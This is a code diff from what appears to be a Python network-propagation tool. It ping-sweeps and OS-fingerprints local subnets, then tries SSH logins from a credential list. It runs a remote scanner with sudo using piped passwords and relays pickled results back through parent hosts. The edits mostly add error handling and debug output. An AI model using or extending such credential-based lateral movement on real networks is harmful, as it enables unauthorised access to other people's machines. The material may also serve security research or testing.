@@ -48,7 +48,7 @@ def get_args():  # TODO: Verify this is positional and must + have help
                         action='store_true',
                         help='relay data back to parent',
                         )
-    if not debug:
+    if debug:
         options = parser.parse_args(['192.168.2.5', '127.0.0.1', '9000'])
     else:
         options = parser.parse_args()
@@ -104,19 +104,21 @@ class Communicator():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             # TODO: Verify success
-            if not father_ip:
-                if type(self.sm_ip) == list:
-                    for ip in self.sm_ip:
-                        try:
-                            s.connect((ip, self.sm_port))
-                            father_ip = ip
-                            break
-                        except TimeoutError:
-                            print('not ' + ip)
-                else:
-                    s.connect((self.sm_ip, self.sm_port))
+            # if not father_ip:
+            if type(self.sm_ip) == list:
+                for ip in self.sm_ip:
+                    try:
+                        s.connect((ip, self.sm_port))
+                        father_ip = ip
+                        break
+                    except TimeoutError:
+                        print('not ' + ip)
+                    except socket.error :
+                        print('not ' + ip)
             else:
-                s.connect((father_ip, self.sm_port))
+                s.connect((self.sm_ip, self.sm_port))
+            # else:
+            #     s.connect((father_ip, self.sm_port))
 
             s.send(pickle.dumps(results))
             s.close()
@@ -138,14 +140,19 @@ class Communicator():
                             break
                         except TimeoutError:
                             print('not ' + ip)
+                        except socket.error :
+                            print('not ' + ip)
                 else:
                     s.connect((self.sm_ip, self.sm_port))
             else:
                 s.connect((father_ip, self.sm_port))
             while True:
-                data = conn.recv(1024)
+                data = conn.recv(4096)
+                print('relay got: ', data)
                 if data and data != b'':
                     s.send(data)
+                    print('relay sent: ', data)
+
                 else:
                     break
         except socket.error as err:
@@ -292,13 +299,13 @@ class RemoteLogin():
         ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         logged_in = False
         for cred in creds: #TODO: Verify
-            if not father_ip:
-                if type(local_ips) == list:
-                    ip = ' '.join(local_ips)
-                else:
-                    ip = local_ips
+            # if not father_ip:
+            if type(local_ips) == list:
+                ip = ' '.join(local_ips)
             else:
-                    ip = father_ip
+                ip = local_ips
+            # else:
+            #         ip = father_ip
 
             scanner_exec_command = "echo " + \
                 cred['pass'] + " | sudo -S ./" + \
@@ -419,7 +426,7 @@ def main():
         for ip in local_ips:
             # TODO: in new thread
             hosts = nmap_scanner.arp_pingsweep(ip)
-            # nmap_scanner.os_detection(hosts)
+            nmap_scanner.os_detection(hosts)
     if debug:
         new_hosts = {'192.168.1.46': Host(
             '192.168.1.46')}
